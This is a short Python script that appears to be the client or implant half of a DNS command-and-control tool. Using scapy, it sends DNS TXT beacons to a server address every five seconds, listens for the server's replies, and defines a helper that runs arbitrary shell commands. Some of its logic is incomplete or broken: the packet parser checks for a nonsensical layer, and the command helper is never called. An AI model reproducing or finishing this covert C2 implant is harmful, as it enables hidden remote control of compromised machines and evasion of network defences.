from dns_c2_modules import *

cond = 0

def RunCommand(cmd):
    return subprocess.getoutput(cmd)
    
def signal_handler(sig, frame):
    print(' Exiting...')
    sys.exit(0)
    
def read_file(file_name):
    with open(file_name, "rb") as f:
        return f.read()

def bin_to_str(bin_data):
    return bin_data.decode('utf-8')
        
def send_beacon(addr,data):
    while cond == 0:
        pkt = IP(dst=addr)/UDP(sport=1234)/DNS(qd=DNSQR(qtype="TXT", qname=data))
        send(pkt)
        print("send beacon")
        time.sleep(5)        

def client_listen():
    print("client start listening")
    sniff_pkt(pfilter="udp and host " + SERVER_ADR,handler=parse_packet)
    
    
def parse_packet(packet):
    if packet.haslayer(scapy):
        print("scapy packet send!")
        return
        
    

if __name__=="__main__":
    signal.signal(signal.SIGINT, signal_handler)
    beacon_thread = threading.Thread(target=send_beacon, args=(SERVER_ADR,BEACON))
    beacon_thread.start()
    client_listen()
